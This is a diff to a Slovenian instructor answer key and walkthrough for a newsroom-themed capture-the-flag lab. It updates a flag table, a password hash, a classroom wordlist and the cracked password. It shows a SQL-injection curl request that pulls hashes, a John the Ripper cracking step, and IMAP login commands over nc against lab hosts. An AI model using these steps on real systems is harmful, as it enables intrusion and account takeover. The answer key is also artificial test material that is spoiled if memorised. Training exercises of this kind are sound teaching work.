@@ -11,8 +11,8 @@ Ta dokument je odgovor in walkthrough za inštruktorja. Ne delite ga udeležence
 | 3.1 | `10.10.20.11` |
 | 4.1 | `NP-CTF{STORED_XSS_IN_NEWSROOM}` |
 | 5.1 | `NP-CTF{EMPLOYEE_DB_LEAK_2026}` |
-| 6.1 | `e98b57dad8ff20a3c286da82b5e730f659d0b75e7bff31b245530b812f8ea901` |
-| 7.1 | `Novice2026!` |
+| 6.1 | `7fa5331351d857d9b522c9b52bcbc6fb4d1609ac9a66fd302a955b607ac66177` |
+| 7.1 | `Kultura2024!` |
 | 8.1 | `NP-CTF{ANONYMOUS_NEWSROOM_FTP}` |
 | 9.1 | `NP-CTF{MAILBOX_COMPROMISED_2026}` |
 | 10.1 | `CVE-2011-2523` |
@@ -125,7 +125,7 @@ Uporaben payload:
 Hash uporabnika `matic.kovac`:
 
 ```text
-e98b57dad8ff20a3c286da82b5e730f659d0b75e7bff31b245530b812f8ea901
+7fa5331351d857d9b522c9b52bcbc6fb4d1609ac9a66fd302a955b607ac66177
 ```
 
 Namig je tudi v tabeli:
@@ -139,24 +139,24 @@ curl "http://10.10.20.11/search.php?q='%20UNION%20SELECT%20id,account,hash_type,
 Ustvari `hash.txt`:
 
 ```bash
-printf '%s\n' 'e98b57dad8ff20a3c286da82b5e730f659d0b75e7bff31b245530b812f8ea901' > hash.txt
+printf '%s\n' '7fa5331351d857d9b522c9b52bcbc6fb4d1609ac9a66fd302a955b607ac66177' > hash.txt
 ```
 
 Majhen wordlist za učilnico:
 
 ```bash
 cat > wordlist.txt <<'EOF'
-Slovenija2026!
-Svet2026!
-Politika2026!
-Gospodarstvo2026!
-Kronika2026!
-Sport2026!
-Šport2026!
-Kultura2026!
-Tehnologija2026!
-Vreme2026!
-Novice2026!
+Slovenija2024!
+Svet2024!
+Politika2024!
+Gospodarstvo2024!
+Kronika2024!
+Sport2024!
+Šport2024!
+Kultura2024!
+Tehnologija2024!
+Vreme2024!
+Novice2024!
 EOF
 ```
 
@@ -177,7 +177,7 @@ john --format=raw-sha256 --show hash.txt
 Plaintext:
 
 ```text
-Novice2026!
+Kultura2024!
 ```
 
 ## 8: Anonymous FTP
@@ -219,7 +219,7 @@ NP-CTF{ANONYMOUS_NEWSROOM_FTP}
 Prijava:
 
 - username: `matic.kovac@novapress.local`
-- password: `Novice2026!`
+- password: `Kultura2024!`
 
 IMAP z `nc`:
 
@@ -230,7 +230,7 @@ nc 10.10.20.51 143
 Ukazi:
 
 ```text
-a1 LOGIN matic.kovac@novapress.local Novice2026!
+a1 LOGIN matic.kovac@novapress.local Kultura2024!
 a2 LIST "" "*"
 a3 SELECT INBOX
 a4 FETCH 1:* BODY[HEADER.FIELDS (SUBJECT FROM)]
